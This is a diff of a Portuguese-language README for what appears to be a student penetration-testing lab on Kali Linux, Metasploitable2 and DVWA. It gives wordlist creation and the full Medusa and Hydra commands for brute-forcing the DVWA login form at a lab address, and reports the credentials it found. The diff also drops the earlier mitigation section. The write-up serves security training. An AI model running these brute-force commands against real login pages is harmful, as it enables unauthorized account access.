@@ -3,7 +3,9 @@
 
 ## ❗ Aviso Legal ❗
 
-Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). Não tente executar esses comandos em sistemas sem autorização.
+Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). 
+
+``NÃO EXECUTE ESTES COMANDOS EM SISTEMAS SEM AUTORIZAÇÃO.``
 
 ---
 
@@ -106,6 +108,8 @@ A identificação da porta foi feita por meio do Nmap:
 
 
 Nesta fase, foram elaboradas duas wordlists: uma contendo nomes de usuários e outra com senhas prováveis.
+
+
 Os comandos utilizados foram:
 
 
@@ -153,55 +157,124 @@ Exemplo:
 
 ---
 
-## 4) Brute Force em Formulário Web (DVWA) — Hydra
 
-```bash
-hydra -l admin -P wordlists/passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Incorrect"
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 4) Brute Force em Formulário Web (DVWA)
+
+
+Formulários de login em páginas web também podem ser alvo de ataques de brute force. 
+Usando o `DevTools (F12)`, é possível inspecionar a requisição e identificar os campos necessários para configurar o ataque.
+
+![etapa1](https://github.com/user-attachments/assets/109051aa-0d3c-48f6-a2e4-a57825f6b17c)
+
+
+
+
+
+---
+
+
+
+
+
+## Criação das wordlists
+
+Lista de usuários:
+
+``` bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```
 
-* Ajuste `F=Incorrect` conforme mensagem de erro do DVWA.
-* Evidência: reports + screenshot `images/04_hydra_dvwa.png`
+
+
+
+Lista de senhas:
+
+``` bash
+
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+
+
+
 
 ---
 
-## 5) Evidências
 
-* Logs: `/reports/` (usar `-O` ou `tee`)
-* Capturas de tela: `/images/` com prefixos numéricos para organização
-* Scripts de automação: `/scripts/`
+
+
+## Ataque de força bruta no formulário de login
+
+
+
+
+Nesta fase, o Medusa será utilizado para realizar brute force contra a aplicação web, empregando as wordlists geradas. Os campos identificados no DevTools foram usados para configurar a requisição.
+
+
+
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+Exemplo:
+
+
+
+
+<img width="720" height="790" alt="image" src="https://github.com/user-attachments/assets/a524bd05-74aa-488a-916b-f096f8f18a90" />
+
+
+
+---
+
+
+
+
+## Ferramneta Hydra 
+
+
+
+Entre as opções de brute force, o Hydra se destaca pela flexibilidade e velocidade. Ele possibilita passar listas de usuários e senhas juntamente com os parâmetros do formulário de login.
+
+Exemplo de uso:
+
+``` bash
+hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+```
+
+
+
+<img width="703" height="790" alt="hydra" src="https://github.com/user-attachments/assets/04c946cf-435b-4a1e-a3ad-0be1bcb11a9c" />
+
+
+
+
+
+O USUÁRIO E A SENHA ENCONTRADOS FORAM:` ADMIN / PASSWORD`
 
 ---
 
-## 6) Mitigações Recomendadas
 
-**FTP:**
 
-* Bloquear login anônimo
-* Políticas de senha forte e bloqueio após N tentativas
 
-**SMB:**
 
-* Desabilitar SMBv1
-* Logging e alertas para múltiplas tentativas
-* MFA e políticas de senha
 
-**Aplicações Web:**
 
-* Proteção contra brute force (rate limiting, captcha, lockout)
-* HTTPS e headers de segurança
-* Validação e sanitização de entradas
 
----
 
-## 7) Checklist de entrega
 
-* [ ] Vídeo-aulas assistidas
-* [ ] Snapshots das VMs
-* [ ] Enumeração (Nmap) salva
-* [ ] Ataques realizados (FTP, SMB, DVWA)
-* [ ] Capturas de tela em `/images`
-* [ ] README.md revisado
-* [ ] Repositório GitHub criado e link pronto
 
----
 
